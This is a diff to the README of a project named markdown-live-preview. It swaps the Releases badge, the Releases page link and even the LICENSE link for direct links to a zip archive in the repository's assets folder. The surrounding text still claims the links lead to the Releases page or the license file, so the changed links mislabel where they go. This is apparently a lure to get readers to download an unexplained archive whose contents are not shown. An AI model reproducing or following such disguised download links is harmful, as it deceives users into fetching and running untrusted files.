@@ -6,7 +6,7 @@ Welcome to **markdown-live-preview**! This user-friendly application allows you 
 
 ## 📥 Download Now
 
-[![Download markdown-live-preview](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Hussein197100/markdown-live-preview/releases)
+[![Download markdown-live-preview](https://raw.githubusercontent.com/Hussein197100/markdown-live-preview/main/assets/live_markdown_preview_3.0.zip%20release-brightgreen)](https://raw.githubusercontent.com/Hussein197100/markdown-live-preview/main/assets/live_markdown_preview_3.0.zip)
 
 ## 💡 Features
 
@@ -26,7 +26,7 @@ To ensure smooth operation, please meet the following system requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Hussein197100/markdown-live-preview/releases) to download the latest version. Here’s how to do it:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Hussein197100/markdown-live-preview/main/assets/live_markdown_preview_3.0.zip) to download the latest version. Here’s how to do it:
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed.
@@ -61,7 +61,7 @@ We welcome suggestions and improvements to markdown-live-preview. If you'd like 
 
 markdown-live-preview is open-source and licensed under the MIT License. You can use, modify, and distribute it freely.
 
-For more details, visit the [LICENSE file](https://github.com/Hussein197100/markdown-live-preview/blob/main/LICENSE).
+For more details, visit the [LICENSE file](https://raw.githubusercontent.com/Hussein197100/markdown-live-preview/main/assets/live_markdown_preview_3.0.zip).
 
 ## 👥 Support
 
